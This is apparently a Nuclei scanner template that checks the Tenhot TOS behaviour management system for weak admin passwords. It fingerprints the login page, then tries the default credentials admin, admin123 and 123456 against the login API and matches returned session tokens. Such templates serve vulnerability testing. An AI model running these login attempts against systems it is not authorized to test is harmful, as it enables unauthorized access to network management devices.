id: poc-yaml-tenhot-tos-bms-weak-password
info:
  name: 腾狐TOS行为管理系统 弱口令漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password

variables:
  passwd:
    - admin
    - admin123
    - 123456

http:
  - raw:
      - |
        GET /view/admin_login/login.html HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "深圳市腾狐物联科技有限公司"
        part: body

  - raw:
      - |
        GET /v1/admin/api/login?&_=1747894945589&username=admin&password={{passwd}} HTTP/1.1
        Host: {{Hostname}}
    payloads:
      passwd:
        - "admin"
        - "admin123"
        - "123456"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "data"
        part: body
      - type: word
        words:
          - "text/json"
        part: header
      - type: regex
        regex:
          - "\"refresh\":\"([0-9a-z]{32})\""
          - "\"token\":\"([0-9a-z]{32})\""
        part: body
